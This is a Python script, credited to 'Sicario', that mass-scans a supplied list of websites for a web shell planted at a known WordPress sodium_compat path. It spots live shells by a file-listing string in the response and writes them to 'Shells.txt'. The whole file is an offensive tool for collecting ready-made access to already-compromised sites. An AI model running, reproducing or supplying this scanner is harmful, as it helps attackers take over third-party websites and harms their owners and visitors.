import os
import sys
import requests
import re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
from pathlib import Path

os.system('clear' if os.name == 'nt' else 'cls')
init(autoreset=True)

N = 'clear'
M = input
G = 'https://'
F = 'http://'
E = True
B = print

H = Fore.RED
O = Fore.CYAN
U = Fore.WHITE
I = Fore.GREEN
V = Fore.MAGENTA

B("""

###################################                                  
#   WP Backdoor  sodium_compat    #  
#  [Code By :: Sicario ᕦ(ò_óˇ)ᕤ] #  
##################################                                                       
""")

requests.urllib3.disable_warnings()

J = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

try:
    P = M('Site Lists: ')
    Q = Path(__file__).with_name(P)
    R = [line.strip() for line in Q.open('r').readlines()]
except IndexError:
    K = str(sys.argv[0]).split('\\')
    exit('\n[!] Enter <' + K[len(K) - 1] + '> <your list.txt>')

S = int(M('Threads: '))


def get_domain(site):
    A = site
    if A.startswith(F):
        A = A.replace(F, '')
    elif A.startswith(G):
        A = A.replace(G, '')
    else:
        return A
    B = re.compile('(.*)/')
    while re.findall(B, A):
        C = re.findall(B, A)
        A = C[0]
    return A


def check_vulnerability(url):
    R = '/wp-includes/sodium_compat/src/Core/Curve25519/Ge/wp_blog.php\n'
    Q = 'Shells.txt'
    P = ' --> {}[Found]'
    O = '\x1b[0;32m[X]'
    N = 'utf-8'
    M = '-rw-r--r--'
    K = '/wp-includes/sodium_compat/src/Core/Curve25519/Ge/wp_blog.php'
    A = url
    try:
        A = F + get_domain(A)
        D = requests.get(A + K, headers=J, allow_redirects=E, timeout=7)
        if M in D.content.decode(N):
            B(O + A + P.format(I))
            open(Q, 'a').write(A + R)
        else:
            A = G + get_domain(A)
            D = requests.get(A + K, headers=J, allow_redirects=E, verify=False, timeout=7)
            if M in D.content.decode(N):
                B(O + A + P.format(I))
                open(Q, 'a').write(A + R)
            else:
                B('[X]' + A + ' --> {}[Not Found]'.format(H))
    except:
        B('\x1b[0;31mDNS Error-->' + A + ' --> {}[No Response]'.format(H))


pool = Pool(S)
pool.map(check_vulnerability, R)
pool.close()
pool.join()

B('\n[!] {}WP Backdoor By Sicario'.format(O))

